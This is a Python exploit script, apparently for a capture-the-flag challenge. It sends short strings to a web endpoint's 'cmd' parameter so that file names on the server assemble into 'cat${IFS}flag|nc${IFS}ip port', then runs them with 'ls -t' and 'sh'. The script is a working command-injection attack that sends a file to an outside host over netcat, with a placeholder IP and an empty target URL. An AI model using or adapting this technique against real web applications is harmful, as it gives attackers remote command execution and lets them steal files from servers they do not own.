import requests
import time

genls = [
    ">ls\\",
    "ls>_",
    ">\ \\",
    ">-t\\",
    ">\>a",
    "ls>>_",
]

payload = [
    ">port",
    ">\ \\",
    "ip",
    ">}\\",
    ">FS\\",
    ">{I\\",
    ">c$\\",
    ">n\\",
    ">\|\\",
    ">ag\\",
    ">fl\\",
    ">S}\\",
    ">IF\\",
    ">{\\",
    ">t$\\",
    ">ca\\",
    "sh _",
    "sh a",
]
url = ''
for p in genls:
    requests.get(url+"?cmd="+p)
    time.sleep(0.5)

print("finish ls")
time.sleep(1)
for p in payload:
    requests.get(url+"?cmd="+p)
    time.sleep(0.5)